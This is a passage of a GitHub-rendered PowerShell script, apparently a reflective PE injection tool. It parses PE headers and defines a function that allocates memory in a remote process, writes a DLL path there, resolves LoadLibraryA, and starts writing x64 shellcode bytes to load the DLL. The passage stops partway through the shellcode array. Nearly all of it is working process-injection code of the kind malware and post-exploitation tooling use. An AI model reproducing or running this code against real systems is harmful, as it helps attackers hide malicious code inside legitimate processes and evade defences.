          <td id="LC1286" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_NT_HEADERS <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.IMAGE_NT_HEADERS</span></span>)</td>
        </tr>
        <tr>
          <td id="L1287" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1287"></td>
          <td id="LC1287" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name NtHeadersPtr <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.NtHeadersPtr</span></span>)</td>
        </tr>
        <tr>
          <td id="L1288" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1288"></td>
          <td id="LC1288" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name PE64Bit <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.PE64Bit</span></span>)</td>
        </tr>
        <tr>
          <td id="L1289" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1289"></td>
          <td id="LC1289" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name <span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfImage<span class="pl-pds">&#39;</span></span> <span class="pl-k">-</span>Value (<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage</span></span>)</td>
        </tr>
        <tr>
          <td id="L1290" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1290"></td>
          <td id="LC1290" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1291" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1291"></td>
          <td id="LC1291" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PE64Bit</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1292" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1292"></td>
          <td id="LC1292" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1293" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1293"></td>
          <td id="LC1293" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$SectionHeaderPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.NtHeadersPtr</span></span>) ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_NT_HEADERS64</span></span>)))</td>
        </tr>
        <tr>
          <td id="L1294" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1294"></td>
          <td id="LC1294" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name SectionHeaderPtr <span class="pl-k">-</span>Value <span class="pl-smi">$SectionHeaderPtr</span></td>
        </tr>
        <tr>
          <td id="L1295" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1295"></td>
          <td id="LC1295" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1296" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1296"></td>
          <td id="LC1296" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1297" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1297"></td>
          <td id="LC1297" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1298" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1298"></td>
          <td id="LC1298" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$SectionHeaderPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.NtHeadersPtr</span></span>) ([<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_NT_HEADERS32</span></span>)))</td>
        </tr>
        <tr>
          <td id="L1299" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1299"></td>
          <td id="LC1299" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name SectionHeaderPtr <span class="pl-k">-</span>Value <span class="pl-smi">$SectionHeaderPtr</span></td>
        </tr>
        <tr>
          <td id="L1300" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1300"></td>
          <td id="LC1300" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1301" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1301"></td>
          <td id="LC1301" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1302" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1302"></td>
          <td id="LC1302" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.IMAGE_NT_HEADERS.FileHeader.Characteristics</span></span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_FILE_DLL</span></span>) <span class="pl-k">-eq</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_FILE_DLL</span></span>)</td>
        </tr>
        <tr>
          <td id="L1303" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1303"></td>
          <td id="LC1303" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1304" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1304"></td>
          <td id="LC1304" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name FileType <span class="pl-k">-</span>Value <span class="pl-s"><span class="pl-pds">&#39;</span>DLL<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L1305" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1305"></td>
          <td id="LC1305" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1306" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1306"></td>
          <td id="LC1306" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">elseif</span> ((<span class="pl-smi">$NtHeadersInfo<span class="pl-smi">.IMAGE_NT_HEADERS.FileHeader.Characteristics</span></span> <span class="pl-k">-band</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_FILE_EXECUTABLE_IMAGE</span></span>) <span class="pl-k">-eq</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.IMAGE_FILE_EXECUTABLE_IMAGE</span></span>)</td>
        </tr>
        <tr>
          <td id="L1307" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1307"></td>
          <td id="LC1307" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1308" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1308"></td>
          <td id="LC1308" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$PEInfo</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name FileType <span class="pl-k">-</span>Value <span class="pl-s"><span class="pl-pds">&#39;</span>EXE<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L1309" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1309"></td>
          <td id="LC1309" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1310" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1310"></td>
          <td id="LC1310" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="L1311" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1311"></td>
          <td id="LC1311" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1312" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1312"></td>
          <td id="LC1312" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>PE file is not an EXE or DLL<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1313" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1313"></td>
          <td id="LC1313" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1314" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1314"></td>
          <td id="LC1314" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1315" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1315"></td>
          <td id="LC1315" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$PEInfo</span></td>
        </tr>
        <tr>
          <td id="L1316" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1316"></td>
          <td id="LC1316" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1317" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1317"></td>
          <td id="LC1317" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1318" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1318"></td>
          <td id="LC1318" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1319" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1319"></td>
          <td id="LC1319" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Import-DllInRemoteProcess</span></td>
        </tr>
        <tr>
          <td id="L1320" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1320"></td>
          <td id="LC1320" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1321" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1321"></td>
          <td id="LC1321" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1322" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1322"></td>
          <td id="LC1322" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span><span class="pl-k">=</span><span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1323" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1323"></td>
          <td id="LC1323" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1324" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1324"></td>
          <td id="LC1324" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1325" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1325"></td>
          <td id="LC1325" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1326" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1326"></td>
          <td id="LC1326" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span><span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span><span class="pl-k">=</span><span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1327" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1327"></td>
          <td id="LC1327" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]</td>
        </tr>
        <tr>
          <td id="L1328" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1328"></td>
          <td id="LC1328" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ImportDllPathPtr</span></td>
        </tr>
        <tr>
          <td id="L1329" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1329"></td>
          <td id="LC1329" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1330" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1330"></td>
          <td id="LC1330" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1331" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1331"></td>
          <td id="LC1331" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PtrSize</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L1332" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1332"></td>
          <td id="LC1332" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1333" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1333"></td>
          <td id="LC1333" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ImportDllPath</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAnsi(<span class="pl-smi">$ImportDllPathPtr</span>)</td>
        </tr>
        <tr>
          <td id="L1334" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1334"></td>
          <td id="LC1334" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DllPathSize</span> <span class="pl-k">=</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]([<span class="pl-k">UInt64</span>]<span class="pl-smi">$ImportDllPath<span class="pl-smi">.Length</span></span> <span class="pl-k">+</span> <span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="L1335" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1335"></td>
          <td id="LC1335" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RImportDllPathPtr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAllocEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> <span class="pl-smi">$DllPathSize</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L1336" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1336"></td>
          <td id="LC1336" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RImportDllPathPtr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1337" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1337"></td>
          <td id="LC1337" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1338" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1338"></td>
          <td id="LC1338" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to allocate memory in the remote process<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1339" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1339"></td>
          <td id="LC1339" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1340" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1340"></td>
          <td id="LC1340" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1341" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1341"></td>
          <td id="LC1341" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UIntPtr</span>]<span class="pl-smi">$NumBytesWritten</span> <span class="pl-k">=</span> [<span class="pl-k">UIntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1342" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1342"></td>
          <td id="LC1342" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WriteProcessMemory.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RImportDllPathPtr</span><span class="pl-k">,</span> <span class="pl-smi">$ImportDllPathPtr</span><span class="pl-k">,</span> <span class="pl-smi">$DllPathSize</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L1343" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1343"></td>
          <td id="LC1343" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1344" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1344"></td>
          <td id="LC1344" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1345" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1345"></td>
          <td id="LC1345" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1346" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1346"></td>
          <td id="LC1346" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to write DLL path to remote process memory<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1347" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1347"></td>
          <td id="LC1347" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1348" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1348"></td>
          <td id="LC1348" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$DllPathSize</span> <span class="pl-k">-ne</span> <span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L1349" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1349"></td>
          <td id="LC1349" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1350" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1350"></td>
          <td id="LC1350" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Didn&#39;t write the expected amount of bytes when writing a DLL path to load to the remote process<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1351" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1351"></td>
          <td id="LC1351" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1352" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1352"></td>
          <td id="LC1352" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1353" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1353"></td>
          <td id="LC1353" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Kernel32Handle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetModuleHandle.Invoke</span></span>(<span class="pl-s"><span class="pl-pds">&quot;</span>kernel32.dll<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1354" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1354"></td>
          <td id="LC1354" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$LoadLibraryAAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$Kernel32Handle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>LoadLibraryA<span class="pl-pds">&quot;</span></span>) <span class="pl-c"><span class="pl-c">#</span>Kernel32 loaded to the same address for all processes</span></td>
        </tr>
        <tr>
          <td id="L1355" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1355"></td>
          <td id="LC1355" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1356" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1356"></td>
          <td id="LC1356" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$DllAddress</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1357" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1357"></td>
          <td id="LC1357" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>For 64bit DLL&#39;s, we can&#39;t use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address</span></td>
        </tr>
        <tr>
          <td id="L1358" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1358"></td>
          <td id="LC1358" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.</span></td>
        </tr>
        <tr>
          <td id="L1359" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1359"></td>
          <td id="LC1359" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$PEInfo<span class="pl-smi">.PE64Bit</span></span> <span class="pl-k">-eq</span> <span class="pl-c1">$true</span>)</td>
        </tr>
        <tr>
          <td id="L1360" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1360"></td>
          <td id="LC1360" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1361" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1361"></td>
          <td id="LC1361" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Allocate memory for the address returned by LoadLibraryA</span></td>
        </tr>
        <tr>
          <td id="L1362" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1362"></td>
          <td id="LC1362" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$LoadLibraryARetMem</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAllocEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> <span class="pl-smi">$DllPathSize</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L1363" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1363"></td>
          <td id="LC1363" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$LoadLibraryARetMem</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1364" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1364"></td>
          <td id="LC1364" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1365" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1365"></td>
          <td id="LC1365" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to allocate memory in the remote process for the return value of LoadLibraryA<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1366" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1366"></td>
          <td id="LC1366" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L1367" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1367"></td>
          <td id="LC1367" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1368" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1368"></td>
          <td id="LC1368" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1369" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1369"></td>
          <td id="LC1369" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)</span></td>
        </tr>
        <tr>
          <td id="L1370" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1370"></td>
          <td id="LC1370" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$LoadLibrarySC1</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x53</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x89</span><span class="pl-k">,</span> <span class="pl-c1">0xe3</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xec</span><span class="pl-k">,</span> <span class="pl-c1">0x20</span><span class="pl-k">,</span> <span class="pl-c1">0x66</span><span class="pl-k">,</span> <span class="pl-c1">0x83</span><span class="pl-k">,</span> <span class="pl-c1">0xe4</span><span class="pl-k">,</span> <span class="pl-c1">0xc0</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xb9</span>)</td>
        </tr>
        <tr>
          <td id="L1371" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1371"></td>
          <td id="LC1371" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$LoadLibrarySC2</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xba</span>)</td>
        </tr>
        <tr>
          <td id="L1372" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1372"></td>
          <td id="LC1372" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$LoadLibrarySC3</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-c1">0xff</span><span class="pl-k">,</span> <span class="pl-c1">0xd2</span><span class="pl-k">,</span> <span class="pl-c1">0x48</span><span class="pl-k">,</span> <span class="pl-c1">0xba</span>)</td>
        </tr>
        <tr>
          <td id="L1373" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1373"></td>
